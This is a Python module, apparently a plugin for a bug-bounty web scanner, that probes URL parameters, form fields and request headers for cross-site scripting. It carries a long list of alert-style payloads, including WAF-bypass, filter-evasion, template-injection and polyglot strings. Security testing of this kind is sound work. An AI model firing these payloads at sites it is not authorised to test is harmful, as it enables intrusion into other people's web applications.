"""
Aggressive XSS Detection Module
Uses real-world payloads and techniques for finding XSS vulnerabilities in bug bounty hunting
"""
from urllib.parse import urlparse, parse_qs, urlencode
import requests
import time
import re
import random
import string
import html
from utils import retry_request

# Real-world XSS payloads that bypass common filters
XSS_PAYLOADS = [
    # Basic payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",

    # WAF bypass payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert(/XSS/)>",
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=confirm('XSS')>",
    "<body onload=alert('XSS')>",

    # Advanced bypass techniques
    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",  # Base64: alert('XSS');
    "<img src=x onerror=window['alert']('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    "<iframe srcdoc='&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'>",

    # Filter evasion
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
    "<svg onload=alert(String.fromCharCode(88,83,83))>",
    "javascript:alert('XSS')",
    "java\0script:alert('XSS')",

    # Event handler variations
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror='alert(\"XSS\")'>",

    # DOM-based payloads
    "<img src=x onerror=eval(name) name=alert('XSS')>",
    "<iframe src='data:text/html,<script>alert(\"XSS\")</script>'>",
    "<object data='data:text/html,<script>alert(\"XSS\")</script>'>",

    # Angular/React bypass
    "{{constructor.constructor('alert(\"XSS\")')()}}",
    "{{$on.constructor('alert(\"XSS\")')()}}",
    "{{7*7}}{{alert('XSS')}}",

    # Polyglot payloads
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "'\"><img src=x onerror=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",

    # Special characters
    "<img src=x onerror=alert('XS'+'S')>",
    "<img src=x onerror=alert(`XSS`)>",
    "<img src=x onerror=alert(\"XSS\")>",

    # Context-specific
    "<img src='x' onerror='alert(\"XSS\")' style='x:expression(alert(\"XSS\"))'>",
    "<div style='background:url(javascript:alert(\"XSS\"))'></div>",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",

    # Short payloads
    "<script>alert`1`</script>",
    "<svg onload=alert`1`>",
    "<img src onerror=alert`1`>",
    "<iframe src=javascript:alert`1`>",
]

# Context-specific payloads
CONTEXT_PAYLOADS = {
    'html': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
    ],
    'attribute': [
        "' onmouseover='alert(\"XSS\")",
        "\" onmouseover=\"alert('XSS')",
        "javascript:alert('XSS')"
    ],
    'javascript': [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "-alert('XSS')-"
    ],
    'url': [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>"
    ]
}

def generate_unique_marker():
    """Generate a unique marker for XSS detection"""
    return 'XSS_TEST_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def detect_xss_context(response_text, payload):
    """Detect where the payload appears in the response to determine context"""
    if not response_text or payload not in response_text:
        return None

    # Find payload location and determine context
    payload_pos = response_text.find(payload)
    before_text = response_text[max(0, payload_pos-100):payload_pos].lower()
    after_text = response_text[payload_pos:payload_pos+100].lower()

    contexts = []

    # Check for HTML context
    if '<' in before_text and '>' in after_text:
        if 'script' in before_text or 'script' in after_text:
            contexts.append('javascript')
        elif any(tag in before_text for tag in ['input', 'textarea', 'div', 'span']):
            contexts.append('attribute')
        else:
            contexts.append('html')

    # Check for URL context
    if 'href=' in before_text or 'src=' in before_text or 'url(' in before_text:
        contexts.append('url')

    # Check for JavaScript context
    if any(js_indicator in before_text for js_indicator in ['var ', 'function', 'return', '=']):
        contexts.append('javascript')

    return contexts[0] if contexts else 'html'

def is_xss_executed(response_text, payload, marker=None):
    """Check if XSS payload was executed or just reflected"""
    if not response_text:
        return False

    # If using marker, check for its presence
    if marker and marker in response_text:
        # Check if marker appears in executable context
        if any(context in response_text.lower() for context in [
            f'<script>{marker}', f'alert("{marker}")', f'alert(\'{marker}\')',
            f'onerror="{marker}"', f'onerror=\'{marker}\''
        ]):
            return True

    # Look for common XSS execution indicators
    execution_indicators = [
        'alert(', 'confirm(', 'prompt(', 'console.log(',
        '<script', '</script>', 'javascript:', 'onerror=',
        'onload=', 'onclick=', 'onmouseover=', 'onfocus='
    ]

    # Check if payload appears in executable form (not encoded)
    payload_lower = payload.lower()
    response_lower = response_text.lower()

    if payload_lower in response_lower:
        # Check if it's properly encoded (safe) vs unencoded (dangerous)
        encoded_versions = [
            html.escape(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#x27;')
        ]

        # If payload appears unencoded, it's potentially executable
        if payload in response_text:
            # Check if it's in an executable context
            for indicator in execution_indicators:
                if indicator in response_lower:
                    return True

        # If only encoded versions appear, it's likely safe
        if all(encoded in response_text for encoded in encoded_versions):
            return False

    return False

def test_xss_with_context(url, param, payload, session, scanner):
    """Test XSS payload with context awareness"""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    base = url.split('?', 1)[0]

    # Generate unique marker
    marker = generate_unique_marker()
    test_payload = payload.replace('XSS', marker)

    qs[param] = test_payload
    query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
    test_url = base + "?" + query

    if scanner._is_denied(test_url):
        return None

    try:
        resp = retry_request(session.get, test_url, timeout=15)
        if not resp:
            return None

        # Check for XSS execution
        if is_xss_executed(resp.text, test_payload, marker):
            # Determine context
            context = detect_xss_context(resp.text, test_payload)

            # Double-check with a different payload for the same context
            if context and context in CONTEXT_PAYLOADS:
                verify_payload = CONTEXT_PAYLOADS[context][0].replace('XSS', marker + '_VERIFY')
                qs[param] = verify_payload
                verify_query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
                verify_url = base + "?" + verify_query

                verify_resp = retry_request(session.get, verify_url, timeout=15)
                if verify_resp and is_xss_executed(verify_resp.text, verify_payload):
                    return {
                        "confirmed": True,
                        "context": context,
                        "payload": test_payload,
                        "marker": marker,
                        "response": resp.text[:1000]
                    }

        # Check for reflection without execution (potential for bypass)
        if test_payload in resp.text or marker in resp.text:
            return {
                "confirmed": False,
                "reflected": True,
                "payload": test_payload,
                "marker": marker,
                "response": resp.text[:1000]
            }

    except Exception:
        pass

    return None

def param_test(url, param, session, scanner):
    """Test parameter for XSS vulnerabilities"""

    # Test with various payload types
    for payload in XSS_PAYLOADS[:15]:  # Test top 15 payloads
        result = test_xss_with_context(url, param, payload, session, scanner)

        if result and result.get("confirmed"):
            return {
                "host": scanner.root,
                "endpoint": url,
                "vul_type": "Cross-Site Scripting (XSS)",
                "param": param,
                "payload": result["payload"],
                "details": f"XSS executed in {result['context']} context with marker: {result['marker']}",
                "request_raw": f"GET {url} HTTP/1.1\n",
                "response_raw": result["response"],
                "short_desc": f"Confirmed XSS in {result['context']} context",
                "mitigation": "Implement proper input validation and output encoding",
                "confidence": "High"
            }

        elif result and result.get("reflected"):
            # Test context-specific payloads for reflected parameter
            contexts_to_test = ['html', 'attribute', 'javascript']

            for context in contexts_to_test:
                if context in CONTEXT_PAYLOADS:
                    for context_payload in CONTEXT_PAYLOADS[context][:2]:
                        context_result = test_xss_with_context(url, param, context_payload, session, scanner)

                        if context_result and context_result.get("confirmed"):
                            return {
                                "host": scanner.root,
                                "endpoint": url,
                                "vul_type": "Cross-Site Scripting (XSS)",
                                "param": param,
                                "payload": context_result["payload"],
                                "details": f"XSS bypass successful in {context} context",
                                "request_raw": f"GET {url} HTTP/1.1\n",
                                "response_raw": context_result["response"],
                                "short_desc": f"XSS via {context} context bypass",
                                "mitigation": "Implement context-aware output encoding",
                                "confidence": "High"
                            }

        time.sleep(scanner.sleep)

    return None

def form_test(form, session, scanner):
    """Test form fields for XSS vulnerabilities"""

    for field in list(form.get("inputs", {}).keys())[:10]:  # Test up to 10 fields
        # Test with high-impact payloads
        test_payloads = [
            "<script>alert('XSS_FORM_TEST')</script>",
            "<img src=x onerror=alert('XSS_FORM_TEST')>",
            "<svg onload=alert('XSS_FORM_TEST')>",
            "javascript:alert('XSS_FORM_TEST')",
            "'\"><script>alert('XSS_FORM_TEST')</script>"
        ]

        for payload in test_payloads:
            marker = generate_unique_marker()
            test_payload = payload.replace('XSS_FORM_TEST', marker)

            data = {k: (test_payload if k == field else v) for k, v in form.get("inputs", {}).items()}

            try:
                if form.get("method", "GET").upper() == "POST":
                    resp = retry_request(session.post, form["action"], data=data, timeout=15)
                else:
                    resp = retry_request(session.get, form["action"], params=data, timeout=15)

                if resp and is_xss_executed(resp.text, test_payload, marker):
                    context = detect_xss_context(resp.text, test_payload)

                    return {
                        "host": scanner.root,
                        "endpoint": form["action"],
                        "vul_type": "Cross-Site Scripting (XSS) - Form",
                        "param": field,
                        "payload": test_payload,
                        "details": f"XSS executed via form field in {context} context",
                        "request_raw": f"FORM {form['action']} DATA: {data}",
                        "response_raw": resp.text[:1000],
                        "short_desc": f"XSS via form field ({context} context)",
                        "mitigation": "Implement proper form input validation and output encoding",
                        "confidence": "High"
                    }

            except Exception:
                pass

            time.sleep(scanner.sleep)

    return None

def header_test(url, session, scanner):
    """Test for XSS in HTTP headers (reflected XSS via headers)"""

    xss_headers = [
        'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
        'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr'
    ]

    test_payload = "<script>alert('HEADER_XSS')</script>"

    for header in xss_headers:
        try:
            headers = {header: test_payload}
            resp = retry_request(session.get, url, headers=headers, timeout=10)

            if resp and test_payload in resp.text:
                if is_xss_executed(resp.text, test_payload):
                    return {
                        "host": scanner.root,
                        "endpoint": url,
                        "vul_type": "Cross-Site Scripting (XSS) - Header",
                        "param": header,
                        "payload": test_payload,
                        "details": f"XSS executed via {header} header reflection",
                        "request_raw": f"GET {url} HTTP/1.1\n{header}: {test_payload}\n",
                        "response_raw": resp.text[:1000],
                        "short_desc": f"Header-based XSS via {header}",
                        "mitigation": "Validate and encode HTTP header values in output",
                        "confidence": "High"
                    }

        except Exception:
            pass

        time.sleep(scanner.sleep)

    return None

def register():
    return {
        "name": "xss_aggressive",
        "param_test": param_test,
        "form_test": form_test,
        "header_test": header_test,
        "description": "Aggressive XSS detection with real-world payloads and bypass techniques"
    }
